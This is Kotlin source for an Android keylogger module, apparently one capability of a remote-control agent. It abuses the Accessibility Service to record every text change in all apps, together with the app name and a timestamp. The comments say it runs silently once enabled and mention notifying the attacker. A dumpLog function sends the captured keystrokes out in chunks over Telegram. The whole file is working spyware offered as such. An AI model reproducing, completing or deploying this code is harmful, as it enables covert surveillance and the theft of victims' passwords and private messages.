package com.example.agent.capabilities

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import com.example.agent.TelegramClient
import com.example.agent.ErrorReporter
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

// ─────────────────────────────────────────────
// KEYLOGGER via Accessibility Service
//
// How it works:
// Android Accessibility API was designed to help
// disabled users — screen readers etc.
// It can observe ALL text changes in all apps.
// We abuse this to log every keystroke.
//
// User must enable it ONCE in:
// Settings → Accessibility → System Service → ON
// After that it runs silently forever.
// ─────────────────────────────────────────────
class KeyloggerCapability : AccessibilityService() {

    companion object {
        private const val LOG_FILE = "keylog.txt"
        private val sdf = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

        // Dump log to Telegram (called from CommandHandler)
        fun dumpLog(ctx: Context, telegram: TelegramClient) {
            val file = File(ctx.filesDir, LOG_FILE)
            if (!file.exists() || file.length() == 0L) {
                telegram.sendText("⌨️ Keylog empty")
                return
            }
            try {
                val content = file.readText()
                if (content.length > 3500) {
                    telegram.sendText("⌨️ KEYLOG (large file - sending in chunks)\n━━━━━━━━━━━━")
                    content.chunked(3500).forEach { chunk ->
                        telegram.sendText(chunk)
                        Thread.sleep(500)
                    }
                } else {
                    telegram.sendText("⌨️ KEYLOG\n━━━━━━━━━━━━\n$content")
                }
            } catch (e: Exception) {
                telegram.sendText("⌨️ Error reading keylog: ${e.message}")
                ErrorReporter.report(e, "KeyloggerCapability")
            }
        }

        fun clearLog(ctx: Context, telegram: TelegramClient? = null) {
            File(ctx.filesDir, LOG_FILE).delete()
            telegram?.sendText("⌨️ Keylog cleared")
        }
    }

    // ─────────────────────────────────────────────
    // onAccessibilityEvent fires on every UI event
    // We only care about text change events
    // ─────────────────────────────────────────────
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val text = event.text.joinToString("").trim()
        if (text.isEmpty()) return

        // What app is the user typing in?
        val pkg = event.packageName?.toString() ?: "unknown"
        val time = sdf.format(Date())

        // Append to log file
        val entry = "[$time][$pkg] $text\n"
        File(filesDir, LOG_FILE).appendText(entry)
    }

    override fun onInterrupt() {}

    // Called when accessibility service connects
    override fun onServiceConnected() {
        super.onServiceConnected()
        // Optionally notify attacker that keylogger is active
    }
}